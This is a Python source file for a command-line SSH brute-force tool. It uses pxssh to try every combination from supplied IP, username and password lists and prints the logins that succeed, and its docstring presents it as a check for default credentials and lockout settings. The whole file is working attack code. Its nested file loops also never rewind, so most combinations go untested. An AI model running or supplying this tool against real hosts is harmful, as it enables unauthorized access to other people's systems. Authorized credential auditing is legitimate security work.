"""
Contributors: Michael Boc, Ahad Sherriff, Christian Rispoli
Date:         9/30/2017
File          SSHScan.py
Language:     Python

This utility will conduct brute force attacks on machines with the ssh
service running. This utility will hopefuly yield two key pieces of
information from the host: 1. Is the host configured with a lockout for
multiple retrys? 2. Does the host have default/easy credentials?
"""


import sys
from pexpect import pxssh


def main():
    """
    The main function takes the command line arguements, and kicks off the
    scanning utiliy
    """
    print("\nThe following credentials have been successfully logged via ssh:")
    print("-----------------------------------------------------------------")
    print("| IPAddr        Username        Password                        |")
    print("-----------------------------------------------------------------")
    test_ssh(sys.argv[1], sys.argv[2], sys.argv[3])
    sys.exit()


def test_ssh(ippath, userpath, passpath):
    """
    This script tests each of the IP address listed in the ipfile for weak SSH
    credentials. It does this with a dictionary attack from the credfile.

    param ippath    string which represents the path to the ip file
    param passpath  string whcih represents the path to the credential file
    """

    # opens the files for reading
    ipfile = open(ippath, 'r')
    userfile = open(userpath, 'r')
    passfile = open(passpath, 'r')
    # initializes a pxssh() object
    ssh = pxssh.pxssh()

    for ip in ipfile:
        ip = ip.rstrip('\n')

        for user in userfile:
            user = user.rstrip('\n')

            for passwd in passfile:
                passwd = passwd.rstrip('\n')
                # use try to catch exception when the login fails
                try:
                    ssh = pxssh.pxssh()
                    ssh.login(ip, user, passwd)
                    ssh.logout()
                    print('  {}\t{}\t\t{}'.format(ip,user,passwd))
                except:
                    pass

    ipfile.close()
    userfile.close()
    passfile.close()


main()
